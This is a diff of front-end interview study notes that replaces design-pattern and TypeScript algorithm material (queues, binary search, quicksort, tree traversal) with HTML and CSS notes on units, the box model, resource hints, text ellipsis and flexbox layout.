@@ -1,1355 +1,239 @@
 
-# 7. System Design.md
+# 1. HTML&CSS.md
 
-## Common Design Patterns in Front-End Development and Their Usage Scenarios
+## CSS Units: Differences and Usage
 
-### Design Principles
-The most important principle in design patterns is the **Open/Closed Principle**, which states that a system should be open for extension but closed for modification. This means you should be able to add new functionality without changing the existing code.
+1. **Pixels (px):** Pixels are a fixed-size unit that is most commonly used in screen media. A pixel is an absolute unit that doesn't change based on other elements. It's great for when you need precise control over element sizing, like for borders or shadows.
 
-### Factory Pattern
-The Factory pattern involves using a factory function to create instances, effectively hiding the `new` keyword to encapsulate the creation process. This pattern is useful for scenarios where the creation process is complex or when there needs to be some control over how instances are created. Examples include the jQuery `$` function and React's `createElement` function.
+2. **Percent (%):** Percentages are relative units and depend on the parent element's size. They are extremely useful for creating layouts that adapt to different screen sizes, maintaining proportions regardless of the parent size.
 
-**Example**:
-```typescript
-class Foo {}
+3. **Ems (em):** Ems are relative to the font-size of the element they are used on. If used on font-size, they are relative to the font-size of the parent element. Ems are great for scalable typography and elements that need to maintain their proportions relative to text size.
 
-function factory() {
-    return new Foo();
+4. **Rems (rem):** Rems are relative to the font-size of the root element (html). They allow for consistent scaling across the entire document and are very useful in responsive design for maintaining uniformity in spacing, layout, and typography.
+
+5. **Viewport Width (vw):** 1vw is equal to 1% of the viewport's width. This unit is helpful for creating elements that scale with the width of the viewport, like for fluid layouts and typography.
+
+6. **Viewport Height (vh):** Similarly, 1vh is 1% of the viewport's height. It's useful for elements that should scale with the height of the viewport, such as sections of a single-page layout.
+
+7. **Viewport Minimum (vmin):** This unit is 1% of the viewport's smaller dimension (height or width). Vmin is particularly useful for maintaining aspect ratios in responsive design.
+
+8. **Viewport Maximum (vmax):** Conversely, vmax is 1% of the larger dimension (height or width). It's less commonly used but can be beneficial for certain design challenges.
+
+## Example of Responsive Design Code
+```css
+/* Base HTML font size */
+html {
+    font-size: 16px; /* Set a standard font size */
 }
 
-const f = factory();
-```
-
-### Singleton Pattern
-The Singleton pattern ensures that a class has only one instance and provides a global point of access to it. This is particularly useful for cases where a single instance of a class should be used across the system, such as the store in Vuex and Redux or a globally unique dialog/modal. JavaScript makes implementing singletons straightforward because there's no need to worry about multithreading issues that might arise in languages like Java, where thread locking mechanisms might be necessary to prevent multiple instances from being created.
-
-**Example**:
-```typescript
-class Singleton {
-    private static instance: Singleton;
-    private constructor() {}
-    static getInstance() {
-        if (!Singleton.instance) {
-            Singleton.instance = new Singleton();
-        }
-        return Singleton.instance;
+/* Responsive font size for smaller screens */
+@media only screen and (max-width: 300px) {
+    html {
+        font-size: 14px; /* Reduce font size on small devices */
     }
-    fn1() {}
-    fn2() {}
 }
 
-const s = Singleton.getInstance();
-s.fn1();
-```
-
-### Proxy Pattern
-The Proxy pattern involves using a proxy layer that clients interact with instead of accessing the object directly. This allows for various operations, like monitoring or intercepting get and set operations, to be performed transparently. A practical example of this pattern is the implementation of Vue3's reactivity system using ES6's `Proxy`.
-
-**Example**:
-```typescript
-const obj = new Proxy({}, {
-    get(target, key) {
-        console.log('get', key);
-        return target[key];
-    },
-    set(target, key, value) {
-        console.log('set', key, value);
-        target[key] = value;
-    }
-});
-obj.name = 'jack';
-console.log(obj.name);
-```
-
-### Observer Pattern
-The Observer pattern is widely used in front-end development. It involves a subject and observers, where the observers are notified and updated whenever the subject undergoes a change. A common example is attaching click event listeners to a button, where each listener acts as an observer to the button's click event.
-
-**Example**:
-```typescript
-btn.addEventListener('click', () => {
-    console.log('click');
-});
-```
-
-### Publish-Subscribe Pattern
-Similar to the Observer pattern, the Publish-Subscribe pattern provides a more decoupled way for components to communicate. Components can publish events to a specific event channel and subscribe to this channel to receive notifications. It's important to unsubscribe from events, especially in component lifecycle hooks, to prevent memory leaks.
-
-**Example**:
-```typescript
-event.on('event-key', () => {
-    console.log('event 1');
-});
-event.on('event-key', () => {
-    console.log('event 2');
-});
-event.emit('event-key');
-
-// Remember to unsubscribe
-function fn1() {}
-event.on('event-key', fn1);
-event.off('event-key', fn1);
-```
-
-### Decorator Pattern
-The Decorator pattern allows for behavior to be added to individual objects, either statically or dynamically, without affecting the behavior of other objects from the same class. This pattern is similar to Aspect-Oriented Programming (AOP) and is supported in ES and TypeScript through decorator syntax. It's particularly useful for adding features or functionalities to existing classes without modifying them.
-
-**Example**:
-```typescript
-@testable
-class MyTestableClass {
-    // ...
+/* Paragraph styling */
+p {
+    font-size: 1rem; /* Font size is relative to HTML element */
+    line-height: 1.5; /* Good for readability */
+    margin: 0 0 1rem 0; /* Spacing for paragraphs */
 }
 
-function testable(target) {
-    target.isTestable = true;
-}
-
-console.log(MyTestableClass.isTestable);
-```
-In the example above, `@testable` is a decorator that adds new functionality to `MyTestableClass`.
-
-### What's the distinction between the Observer pattern and the Publish-Subscribe pattern?
-
-### Observer Pattern
-In the Observer pattern, the subject (the object being observed) and the observers (the objects that want to be notified of changes in the subject) have direct knowledge of each other. This means there is a direct relationship where the subject holds references to the observers and directly notifies them of any changes. This pattern allows for a straightforward and direct communication line but can lead to higher coupling between the subject and its observers.
-
-#### Characteristics:
-- **Direct Communication**: Observers are directly registered with the subject.
-- **Coupling**: There is a higher degree of coupling, as the subject and observers are directly aware of each other.
-- **Use Case**: Suitable for simpler scenarios where the subject's state change is of interest to specific observers directly related to the subject.
-
-### Publish-Subscribe Pattern
-The Publish-Subscribe pattern, on the other hand, introduces a middle layer known as the "event channel" or "message broker," which decouples the publishers (the sources of events) from the subscribers (the receivers of events). Publishers publish events to the event channel without knowing who the subscribers will be. Similarly, subscribers listen for events through the event channel without knowing who the publishers are. This level of indirection adds flexibility and reduces coupling between components, making the system more scalable and easier to extend.
-
-#### Characteristics:
-- **Indirect Communication**: The communication between publishers and subscribers is mediated by an event channel, without direct knowledge of each other.
-- **Coupling**: There is lower coupling due to the presence of the event channel as an intermediary.
-- **Use Case**: Ideal for more complex scenarios where the event source and event consumers need to remain decoupled for scalability and maintainability reasons.
-
-In summary, the key difference lies in the relationship and communication method between the parties involved: the Observer pattern facilitates direct communication between the subject and its observers, resulting in tighter coupling, whereas the Publish-Subscribe pattern uses an event channel to mediate communication, leading to looser coupling and greater flexibility.
-
-## Benefits of Using Cloud Functions like Google Cloud Compared to Traditional Front-end/Back-end Separation
-
-Cloud functions, such as those provided by Google Cloud, offer several advantages over the traditional front-end/back-end separation architecture. These benefits stem from cloud functions' ability to operate in a serverless environment, which changes how applications are built, deployed, and scaled. Below, we detail these benefits:
-
-### Cost Efficiency
-- **Google Cloud Functions** operate on a pay-as-you-go model, where charges are incurred only when the code is executed. This is particularly beneficial for applications with fluctuating traffic, as it aligns operational costs directly with actual usage, avoiding the need to pay for idle resources.
-
-### Simplified Management
-- **Serverless Architecture**: With Google Cloud Functions, there's no need to manage servers. Google handles all the infrastructure management tasks, including maintenance, patching, and security. In contrast, traditional architectures, even when utilizing virtual or cloud servers, require developers or operations teams to manage server configuration and upkeep.
-
-### Automatic Scaling
-- **Adaptability to Traffic**: Google Cloud Functions automatically scale based on the number of requests. This ensures that during peak traffic periods, more resources are allocated to handle increased concurrent requests, and during low traffic times, resources are reduced to save costs. Traditional models often require manual intervention or additional automation tools for scaling.
-
-### Rapid Iteration
-- **Development Agility**: The serverless model enables developers to quickly create and deploy code without worrying about underlying infrastructure. This supports faster development cycles and rapid iteration, whereas traditional deployment models might involve complex configuration and deployment processes.
-
-### Integration and Automation
-- **Seamless Ecosystem Connectivity**: Google Cloud Functions can be easily integrated with other services and tools within the Google Cloud Platform (GCP), such as Google Cloud Pub/Sub and Google Cloud Storage. This facilitates the creation of end-to-end automated solutions, streamlining the development process and enhancing functionality.
-
-### Event-Driven Architecture
-- **Responsive Microservices**: Google Cloud Functions inherently support an event-driven architecture, directly responding to events from Google Cloud services, like file uploads to Google Cloud Storage or messages published to Google Cloud Pub/Sub. This model is ideal for building highly decoupled and responsive microservices, as it allows services to react immediately to changes and triggers within the ecosystem.
-# 3. Algorithms and Data Structures.md
-
-## How is a linked list used in front-end development?
-In front-end development, linked lists aren't commonly used, but a notable example is in React's Fiber architecture. React Fiber uses a linked list to manage the component tree instead of a traditional tree structure. This shift allows React to perform work in chunks and prioritize updates more effectively. The linked list structure enables incremental rendering, where the rendering work can be paused and resumed, improving app performance and user experience. It also facilitates the handling of concurrent operations in the UI, allowing for smoother and more responsive interfaces. Overall, while linked lists are not a standard tool in front-end development, their use in React Fiber demonstrates how they can optimize rendering and state management in complex applications
-
-## implementing a queue using a linked list in TypeScript:
-In TypeScript, you can implement a queue using a linked list by maintaining references to both the head and tail of the list. The queue operations work as follows:
-
-Enqueue (Add to Queue): To add an item, you create a new node and attach it to the current tail of the linked list, then update the tail reference to this new node. If the queue is empty, this new node is both the head and tail.
-
-Dequeue (Remove from Queue): To remove an item, you take the value from the head of the linked list and then update the head reference to the next node in the list. If the list becomes empty, update the tail reference to null as well.
-
-This approach ensures that both enqueue and dequeue operations are O(1), providing efficient queue management. It’s important to handle edge cases, such as dequeueing from an empty queue, to avoid errors.
-
-## Implement a queue in TypeScript, and is a linked list faster or an array?
-In TypeScript, implementing a queue can be done using either an array or a linked list. An array-based queue is simple to implement but its dequeue operation (shift) is O(n) due to the need to shift elements. In contrast, a linked list implementation offers O(1) time complexity for both enqueue and dequeue operations, as it allows for constant-time insertions and deletions without reindexing.
-
-So, while both can be used to implement a queue, a linked list is generally faster and more efficient for typical queue operations. This makes linked lists preferable in scenarios where frequent enqueue and dequeue operations are expected, whereas arrays might be more suitable when memory efficiency is a priority and operations are less frequent.
-
-## implement a queue with linkedlist
-```ts
-interface ILinkedListNode {
-    val: number;
-    next: ILinkedListNode | null;
-}
-
-class Queue {
-    // undefined usually used for uninitialized value, null for empty values, here null is better
-    private head: ILinkedListNode | null;
-    private tail: ILinkedListNode | null;
-    private len: number;
-
-    // use constructor instead of set values above, make code more readable
-    // Inside class methods, use this to refer to instance variables 
-    constructor(){
-        this.head = null;
-        this.tail = null;
-        this.len = 0;
-    }
-
-    // for better clarity, mention return type void if return nothing
-    offer(val: number): void {
-        const temp: ILinkedListNode = {val: val, next: null};
-        // in case the queue is empty, use === check value and type
-        if (this.head === null) {
-            this.head = temp;
-            this.tail = temp;
-        } 
-        // normal case
-        else {
-            // avoid non-null assertions to avoid legitimate null/undefined errors, i.e. try avoid below commented code
-            // this.tail!.next = temp;
-            if (this.tail) {
-                this.tail.next = temp;
-            }
-            this.tail = temp;
-        }
-        this.len += 1;
-    }
-
-    poll(): number | null {
-        if (this.head === null) {
-            return null;
-        } 
-        if (this.head.next === null) {
-            this.tail = null;
-        }
-        // here use const instead of let, since it never changes
-        const temp = this.head.val;
-        this.head = this.head.next;
-        this.len -= 1;
-        return temp;
-    }
-
-    // with get keyword, we can use the return value as an attribute, e.g. const queue = new Queue(); const len = queue.size;
-    get size(): number {
-        return this.len;
+/* Responsive element styling */
+@media only screen and (max-width: 768px) {
+    p {
+        font-size: 0.9rem; /* Smaller font size on tablets and smaller devices */
     }
 }
 ```
 
-## Implement binary search and describe time complexity
-```ts
-// assume input nums is in ascending order, return the index or null if not found
-function binarySearch(nums: number[], target: number): number | null {
-    let left: number = 0;
-    let right: number = nums.length - 1;
-    // use <= for case length = 1
-    while (left <= right) {
-        // Use Math.floor to avoid floating point values for the mid index.
-        let mid: number = Math.floor((left + right) / 2);
-        if (nums[mid] === target) {
-            return mid;
-        }
-        if (nums[mid] > target) {
-            right = mid - 1;
-        } else {
-            left = mid + 1;
-        }
+This example demonstrates responsive typography using rem units and media queries. The base font size is set on the `html` element, which the `rem` units reference. Media queries adjust the base font size for smaller screens, affecting all elements using `rem`. The `p` (paragraph) styling is also adjusted for smaller screens to ensure readability.
+
+## Box Model Explanation
+
+The CSS box model is a fundamental concept in web development that describes how the dimensions of each HTML element are calculated. The components of the box model, from outer to inner, are:
+
+1. **Margin**: The outermost layer, which defines the space between the element's border and surrounding elements.
+2. **Border**: The border that surrounds the padding and content. It's the boundary between the margin and the padding.
+3. **Padding**: The space between the border and the content. It increases the space inside the element.
+4. **Content**: The innermost area where the actual text, images, or other media are displayed.
+5. **Box-sizing**: A property that determines how the width and height of an element are calculated. If set to `border-box`, the element's padding and border are included in the element's width and height. If set to `content-box`, the width and height only include the content, not the padding or border. 
+
+## Differences Between offsetHeight, scrollHeight, and clientHeight
+
+1. **offsetHeight**: The `offsetHeight` property measures the total visible height of an element, including padding, border, and the scroll bar on the element (if any), but excluding margins. It's the outermost height measurement that includes everything inside the margin.
+
+2. **clientHeight**: The `clientHeight` property measures the visible content area (including padding) of an element but excludes the border, scrollbar, and margin. It's useful for getting the actual area available for the content inside an element.
+
+3. **scrollHeight**: The `scrollHeight` property measures the total height of an element's content, including content not visible on the screen due to overflow. It includes padding but excludes borders, scrollbar, and margin. This is larger than the `clientHeight` if there's content that overflows outside the visible area.
+
+### Sample Answer
+The primary differences among `offsetHeight`, `scrollHeight`, and `clientHeight` relate to what they include in their calculations. `offsetHeight` includes the border, padding, and the vertical scrollbar (if present), making it the total outer height. `clientHeight` includes the padding and the viewable content height, but not the border or scrollbar. Lastly, `scrollHeight` measures the total height of the content, including what's not visible due to overflow, plus padding. These properties are essential for dynamically managing layouts, handling scrolling behavior, or adjusting elements based on their content size.
+
+## Retina Screen and 1px Lines Implementation
+
+When designing for Retina displays, setting elements to 1px using CSS can result in lines that appear too thick, due to some mobile phones having a Device Pixel Ratio (DPR) of 2. This means 1 CSS pixel could use 2 physical pixels, making the line appear thicker than intended. Directly setting elements to 0.5px can lead to compatibility issues across different browsers. To achieve the desired 1px line appearance on Retina screens, we can use CSS pseudo-elements combined with the `transform` property for optimization. 
+
+Here's an improved and corrected example:
+
+```css
+#box::before {
+  content: '';
+  position: absolute;
+  left: 0;
+  bottom: 0;
+  width: 100%;
+  height: 1px;
+  background: #d9d9d9;
+  transform: scaleY(0.5);
+  transform-origin: 0 0;
+}
+```
+
+This approach leverages the `::before` pseudo-element to create a line that visually represents 1px on Retina displays by scaling it down by 50% along the Y-axis. This effectively simulates a thinner line without causing browser compatibility issues.
+
+### Handling Borders with Border-Radius
+
+When dealing with elements that have a border-radius, applying a thin border can be slightly more complex due to the way borders interact with the border-radius. In such cases, using `box-shadow` can offer a solution that allows for a fine-tuned appearance:
+
+```css
+#box {
+  box-shadow: 0 0 0 0.5px #d9d9d9;
+}
+```
+
+This method applies a `box-shadow` that mimics a border, allowing for the adjustment of its thickness to achieve the desired 0.5px visual effect on Retina displays. It's a versatile approach that maintains the element's aesthetic, including when a border-radius is applied, ensuring the visual consistency of the design across high-resolution screens.
+
+## What is the difference between `defer` and `async` attributes in `<script>` elements?
+
+The `<script>` element can be used to include JavaScript in HTML documents. When scripts are loaded and executed, they can affect how quickly a page becomes interactive. The `defer` and `async` attributes provide different ways to control this behavior.
+
+### `defer`
+The `defer` attribute tells the browser to continue parsing the HTML document while the script is being downloaded asynchronously. The key point is that the script execution is deferred until the entire HTML document has been parsed. This means that scripts with `defer` will not run until the HTML parsing is complete, which is similar to placing a `<script>` tag at the end of the `<body>` element. However, `defer` ensures that scripts are executed in the order they appear in the document, which is not guaranteed when scripts are manually placed at the bottom of the `<body>`. 
+
+### `async`
+The `async` attribute also allows the script to be downloaded in parallel to HTML parsing. However, unlike `defer`, `async` scripts are executed as soon as they are downloaded, which could be before or after the HTML parsing is complete. This means the execution order of scripts is not guaranteed. `async` is best used for scripts that do not depend on other scripts and do not modify the DOM (Document Object Model).
+
+### Difference between Prefetch and DNS-Prefetch
+
+#### Prefetch and Preload
+- **Preload** is a directive used to instruct the browser to load a resource early in the page's lifecycle, because it will be needed soon. This is crucial for resources that are critical to the current page's content, ensuring they are loaded with higher priority. The syntax is `<link rel="preload" href="example.js" as="script">` (or as="style" for CSS files), indicating that the resource is important for the immediate page load.
+- **Prefetch** is a hint to the browser that a resource might be needed in the future, but not on the current page. Resources prefetched are fetched and stored in the cache with low priority, during idle browser time, making them faster to load on subsequent page visits. The syntax is `<link rel="prefetch" href="example.js" as="script">`, suggesting the resource may be used in subsequent pages or actions.
+
+#### DNS-Prefetch and Preconnect
+- **DNS-Prefetch** is a way to resolve domain names (DNS lookups) before a user clicks on a link. This process reduces latency when the user navigates to the linked resource, as the DNS resolution step is already completed. The syntax for using it is `<link rel="dns-prefetch" href="//example.com">`. It's especially useful for third-party resources or any links that lead to different domains.
+- **Preconnect** goes a step further than DNS-prefetch by not only resolving the domain name but also performing the TCP handshake and, if the protocol is HTTPS, the TLS negotiation. This fully prepares the browser for a future connection, reducing the connection establishment time. The syntax is `<link rel="preconnect" href="//example.com">`. Preconnect is more comprehensive than DNS-prefetch because it completes all the preliminary network steps, making the resource ready to be used with minimal delay.
+
+### Summary
+- Use **preload** for critical resources needed for the current page to ensure they are loaded quickly and with high priority.
+- Use **prefetch** for resources that will be needed in subsequent page visits, to speed up their load time when the user navigates to those pages.
+- Use **dns-prefetch** to resolve domain names ahead of time, reducing DNS lookup time for third-party resources or anticipated navigations.
+- Use **preconnect** to fully prepare for a future connection, including DNS lookup, TCP handshake, and TLS negotiation, minimizing the latency for high-priority, cross-origin requests.
+
+## How to handle text Overflow with Ellipsis in CSS? 
+
+When working with web design and front-end development, managing text overflow elegantly ensures that the UI remains clean and user-friendly even when content exceeds its container's bounds. CSS provides mechanisms to handle single-line and multi-line text overflow scenarios, allowing text that doesn't fit in its container to be truncated and represented with an ellipsis (`...`). Here's how to achieve this:
+
+### Single-line Text Overflow
+
+For single-line text overflow, where you want text that exceeds the width of its container to end with an ellipsis, you can use the following CSS properties:
+
+```css
+#box1 {
+    border: 1px solid #ccc;
+    width: 100px; /* Fixed width */
+    white-space: nowrap; /* Prevents text from wrapping to a new line */
+    overflow: hidden; /* Hides text that overflows the container's bounds */
+    text-overflow: ellipsis; /* Adds an ellipsis to indicate text overflow */
+}
+```
+
+In this setup, `white-space: nowrap` ensures the text stays on a single line, `overflow: hidden` hides any overflow, and `text-overflow: ellipsis` replaces the hidden overflow text with an ellipsis.
+
+### Multi-line Text Overflow
+
+Handling text overflow for multi-line scenarios, where you want to limit the text to a specific number of lines and display an ellipsis for overflow text, involves a bit more CSS, particularly leveraging webkit-specific properties:
+
+```css
+#box2 {
+    border: 1px solid #ccc;
+    width: 100px; /* Fixed width */
+    overflow: hidden; /* Hides text that overflows the container's bounds */
+    display: -webkit-box; /* Displays the container as a webkit flex box */
+    -webkit-box-orient: vertical; /* Sets the children's orientation to vertical */
+    -webkit-line-clamp: 3; /* Limits the box to showing 3 lines of text, with overflow indicated by an ellipsis */
+}
+```
+
+This method uses `-webkit-box`, `-webkit-box-orient`, and `-webkit-line-clamp` to achieve multi-line truncation. It's important to note that this approach is somewhat limited by its compatibility with only webkit-based browsers (e.g., Safari, Chrome). However, it's widely used due to its simplicity and effectiveness in most web scenarios.
+
+## CSS Layout: Flexbox Solution for a Responsive Three-Div Setup
+
+### Scenario Description
+You have a large `div` element that contains three smaller `div` elements. The goal is to position these three child `div`s side by side — left, center, and right within the parent `div`. The left and right `div`s have a fixed width, while the center `div` should automatically adjust its width to occupy all remaining space.
+
+### Solution and Explanation
+
+To achieve this layout, you can use CSS Flexbox. Flexbox provides an efficient way to distribute space and align items within a container, even when their size is unknown or dynamic.
+
+Here is a step-by-step guide to implement the described layout:
+
+1. **Set the Display Property of the Parent `div`**: First, you need to define the parent `div` as a flex container. This is done by setting its `display` property to `flex`.
+
+    ```css
+    .parent {
+        display: flex;
     }
-    return null;
-}
-```
-Binary search has a time complexity of O(log n), where n is the number of elements in the array. This is because the algorithm divides the search interval in half with each step.
+    ```
 
-## Given an ascending number array and a number n, find 2 numbers in array sum is n. 
-```ts
-function twoSumsAscending(nums: number[], target: number): number[]{
-    let left: number = 0;
-    let right: number = nums.length - 1;
-    // Use '<' instead of '<=' to prevent the same element from being used twice
-    while (left < right) {
-        if (nums[left] + nums[right] === target) {
-            return [nums[left], nums[right]];
-        }
-        if (nums[left] + nums[right] < target) {
-            left++;
-        } else {
-            right--;
-        }
+2. **Define the Width of the Child `div`s**: Next, specify the width for the left and right child `div`s since they have a fixed size. The width can be set in pixels, ems, or any other CSS units.
+
+    ```css
+    .left, .right {
+        width: 100px; /* Example fixed width */
     }
-    return [];
-}
-```
+    ```
 
-## In-order, pre-order and post-order
-In the context of binary trees, in-order, pre-order, and post-order refer to the three primary ways to traverse the nodes of the tree, each with a different order for visiting the nodes.
-**In-Order Traversal**: Left, Root, Right.
-**Pre-Order Traversal**: Root, Left, Right.
-**Post-Order Traversal**: Left, Right, Root.
+3. **Flexible Width for the Center `div`**: For the center `div`, you want it to fill the remaining space. This is achieved by setting the `flex-grow` property to a value greater than 0. Setting it to 1 tells the `div` to occupy any available space.
 
-## find the kth smallest value in a binary search tree
-```ts
-interface ITreeNode{
-    val: number;
-    left: ITreeNode | null;
-    right: ITreeNode | null;
-}
-
-function findKthSmallest(root:ITreeNode, k: number): number | null {
-    let count: number = 0;
-    let result: number | null = null;
-
-    // this function is in-order
-    function dfsHelper(curNode: ITreeNode) {
-        if (curNode === null || result !== null) return;
-
-        dfsHelper(curNode.left);
-
-        if (++count === k) {
-            result = curNode.val;
-            return;
-        }
-
-        dfsHelper(curNode.right);
+    ```css
+    .center {
+        flex-grow: 1;
     }
+    ```
 
-    dfsHelper(root);
+### Complete CSS Example
 
-    return result;
+```css
+.parent {
+    display: flex;
+}
+
+.left, .right {
+    width: 100px; /* Fixed width */
+}
+
+.center {
+    flex-grow: 1; /* Occupies the remaining space */
 }
 ```
 
-## Why binary tree so important, not trinary or quanary tree? 
-While arrays provide faster access (O(1)), adding or deleting elements is less efficient (O(N)). Linked lists offer efficient insertion and deletion (O(1)), but slower access times (O(N)).
+### HTML Structure
 
-Compared to arrays and linked lists, binary trees offer a good balance with O(logn) time complexity for access, add, and delete operations when the tree is balanced.
-
-Binary trees, as opposed to ternary or quaternary trees, provide a simpler and more efficient structure for most applications. They strike a balance between maintaining low complexity and achieving efficient operations.
-
-## Why balancing binary tree so important?
-An unbalanced binary tree can degenerate into a linked list, leading to O(N) time complexity for operations like add, delete, update, and search. A balanced binary tree, on the other hand, maintains a height of O(logn), ensuring that operations can be performed in logarithmic time. This balance is essential for leveraging the efficiency of binary trees, especially in scenarios where quick search, insertion, and deletion are frequently required.
-
-## Why tree operations has time complexity of O(logn)?
-`logn` represents the height of a balanced binary tree. In a balanced tree, each operation like search, insert, or delete involves traversing a path from the root to a leaf node, or vice versa. The number of levels (or height) of the tree determines the maximum number of steps needed for these operations. Since a balanced binary tree is structured to have a height that grows logarithmically with the number of nodes (n), the operations are significantly more efficient than linear time complexity, particularly for large datasets.
-
-## What is a black-red tree? What is B tree? 
-- **Red-Black Tree**: It is a type of self-balancing binary search tree. Each node in the tree is colored either red or black. The tree uses these colors along with specific rules to ensure that the tree remains balanced during insertions and deletions. This balancing act ensures that the tree maintains its O(logn) time complexity for operations. Red-Black Trees are particularly valued for their relatively simple balancing logic and efficient operations, making them suitable for various applications, including implementing associative arrays and priority queues.
-
-- **B-Tree**: A B-Tree is a self-balancing tree data structure that maintains sorted data and allows searches, sequential access, insertions, and deletions in logarithmic time. Unlike binary trees, B-Trees are multi-way trees (having more than two children) and are optimized for systems that read and write large blocks of data, like databases and filesystems. They are designed to efficiently minimize disk I/O operations, and their branching factor (the number of child nodes) can be adjusted to optimize the balance between the tree's height and the number of nodes accessed per operation.
-
-Both Red-Black Trees and B-Trees are advanced tree structures designed to optimize performance for different scenarios, with Red-Black Trees often used in memory and B-Trees in disk-based storage systems.
-
-## Write a recursive function and a non-recursive return the nth fibonacci number, explain why the recursive one may crash
-```ts
-// method one, recursive
-function fibonacci(n: number): number {
-    if (n === 0) return 0;
-    if (n === 1) return 1;
-    return fibonacci(n - 1) + fibonacci(n - 2)
-}
-
-// method 2, loop
-function fibonacci(n: number): number {
-    if (n < 0) return -1;
-    if (n === 0) return 0;
-    if (n === 1) return 1;
-    let prevprev = 0, prev = 1, result = 0;
-
-    for (let i = 2; i <= n; i++) {
-        result = prevprev + prev;
-        prevprev = prev;
-        prev = result;
-    }
-
-    return result;
-}
-```
-
-In the recursive Fibonacci function, each function call is added to the call stack, a special region in memory where function call information is stored. When `n` is large, this results in a very deep recursion, where each call to `fibonacci` leads to two more calls, exponentially increasing the number of calls on the stack. This can quickly exceed the memory limit of the stack, leading to a stack overflow error. This happens because the stack has a limited size and cannot accommodate the large number of nested function calls required by the recursive approach for large values of `n`.
-
-### Recursive Implementation:
-
-- **Time Complexity: O(2^n)**
-
-  Each call to `fibonacciRecursive` generates two more calls, except for the base cases. This exponential growth results in a time complexity of O(2^n), where `n` is the input number.
-
-  e.g. we want to calculate f(8)  
-  f(8) = f(7) + f (6), and f(7) = f(6) + f(5)  
-  Therefore, F(6) is calculated twice which is redundant computations
-
-- **Space Complexity: O(n)**
-
-  The space complexity is determined by the height of the call stack, which in the worst case (when `n` is large) will have `n` calls stacked on top of each other before reaching the base case. This results in a space complexity of O(n).
-
-### Iterative Implementation:
-
-- **Time Complexity: O(n)**
-
-  The function iterates from 2 to `n` once, performing a constant amount of work in each iteration. Therefore, the time complexity is linear, O(n).
-
-- **Space Complexity: O(1)**
-
-  The iterative solution uses a fixed amount of space (the variables `prevprev`, `prev`, and `result`). This amount of space does not change as `n` increases, making the space complexity constant, O(1).
-
-## What is dynamic programing
-- Dynamic programming involves breaking down a complex problem into smaller, overlapping subproblems, solving these down to the simplest base cases. 
-- It uses recursion with memoization, or iterative methods with tabulation, to optimize by preventing redundant computations.
-
-## A frog, can jump 1 or 2 steps each time. How many ways can i jump a n step stair? 
-```ts
-function frogJumpDP(n: number): number {
-    // only one way to go to step 0 which is doing nothing
-    if (n === 0) return 1;
-    // the first 1 is for simplicity of calculation so that dp[2] will be 2
-    // the second 1 is only one way to go to stair 1
-    const dp = [1, 1];
-    for (let i = 2; i <= n; i++) {
-        dp[i] = dp[i - 1] + dp[i - 2];
-    }
-    return dp[n];
-}
-
-```
-
-## Move all zeros in an array to its end 
-- maintaining the order of the non-zero elements. 
-- The operation should be performed in-place
-```ts
-function moveZeroToEnd(nums: number[]): void {
-    let zeroStart: number = -1;
-    for (let i = 0; i < nums.length; i++) {
-        if (nums[i] !== 0 && zeroStart !== -1) {
-            nums[zeroStart] = nums[i];
-            nums[i] = 0;
-            zeroStart++;
-        } else if (nums[i] === 0 && zeroStart === -1) {
-            zeroStart = i;
-        }
-    }
-}
-```
-
-## Identify the longest sequence of a continuous character in a given string. 
-For example, for the string 'aabaacceee', the function should return 'e'.
-```ts
-interface IRes {
-    char: string;
-    len: number;
-}
-
-function findLongest(s: string): IRes {
-    if (s.length === 0) return { char: '', len: 0 }; // Handle empty string
-
-    let longestChar: string = s.charAt(0);
-    let longest: number = 1;
-    let currentChar: string = s.charAt(0);
-    let currentLength: number = 1;
-
-    for (let i = 1; i < s.length; i++) {
-        if (s.charAt(i) === currentChar) {
-            currentLength++;
-        } else {
-            if (currentLength > longest) {
-                longest = currentLength;
-                longestChar = currentChar;
-            }
-            currentChar = s.charAt(i);
-            currentLength = 1;
-        }
-    }
-
-    // Check and update for the last character sequence
-    if (currentLength > longest) {
-        longest = currentLength;
-        longestChar = currentChar;
-    }
-
-    return { char: longestChar, len: longest };
-}
-
-```
-
-## Implement quicksort in typescript
-```ts
-function quickSort(nums: number[]): number[] {
-    if (nums.length <= 1) return nums;
-
-    const midInd = Math.floor(nums.length / 2);
-    // array.splice(a, b) removes b elements starting from index a from the array. The return value is an array of the removed elements.
-    const mid = nums.splice(midInd, 1)[0];
-
-    const left: number[] = []
-    const right: number[] = []
-    for (let i = 0; i < nums.length; i++) {
-        if (nums[i] < mid) {
-            left.push(nums[i]);
-        } else {
-            right.push(nums[i]);
-        }
-    }
-
-    return quickSort(left).concat([mid], quickSort(right));
-}
-```
-
-- **Average Case (O(n log n))**: In the average case, the pivot divides the array into two roughly equal parts, leading to a logarithmic number of recursive calls (log n). In each level of recursion, the algorithm performs O(n) operations to partition the array around the pivot. Thus, the average case is O(n log n).
-
-- **Worst Case (O(n²))**: The worst case occurs when the pivot is the smallest or largest element in each recursive call, leading to unbalanced partitions. This results in n recursive calls, each doing O(n) work, thus O(n²).
-
-## find palindrome number
-Palindrome number, e.g. 1, 2, 22, 101, 10001, 20002, 2002 etc
-```ts
-function findAllPalindromeNumbers(max: number): number[] {
-    const res = []
-
-    for (let i = 0; i <= max; i++) {
-        // find reversed number first, then compare
-        let reversedNum: number = 0, temp: number = i;
-        while (temp !== 0) {
-            reversedNum *= 10;
-            reversedNum += temp % 10;
-            temp = Math.floor(temp / 10);
-        }
-        if (reversedNum === i) {
-            res.push(i);
-        }
-    }
-
-    return res;
-}
-
-function findAllPalindromeNumbers(max: number): number[] {
-    const res = [];
-
-    for (let i = 0; i < max; i++) {
-        const s = i.toString();
-        let start = 0, end = s.length - 1;
-        let isPalindrome = true;
-        while (start < end) {
-            if (s.charAt(start++) !== s.charAt(end--)) {
-                isPalindrome = false;
-                break;
-            }
-        }
-        if (isPalindrome) res.push(i);
-    }
-
-    return res;
-}
-```
-
-## Identify whether a string is prefix of a word in dictionary
-A Trie, or a prefix tree, is an optimal data structure for this problem. It stores strings in a tree-like structure, where each node represents a character of a string. The root represents an empty string, and each path from the root to a leaf node represents a word.
-
-To check if a string is a prefix of any word in the dictionary, we insert each word into the Trie. Then, for the given string, we traverse the Trie from the root. If we can traverse the Trie following the characters of the string without any breaks, and reach a node (not necessarily a leaf node), then the string is a valid prefix in the dictionary.
-
-This approach is efficient in terms of time complexity, especially for multiple prefix searches, as each search is only as long as the length of the string being searched.
-
-e.g. word apple may looks like this: {a: {p: {p: {l: {e: null}}}}}
-
-The time complexity for this is O(m) where m is the length of the string
-
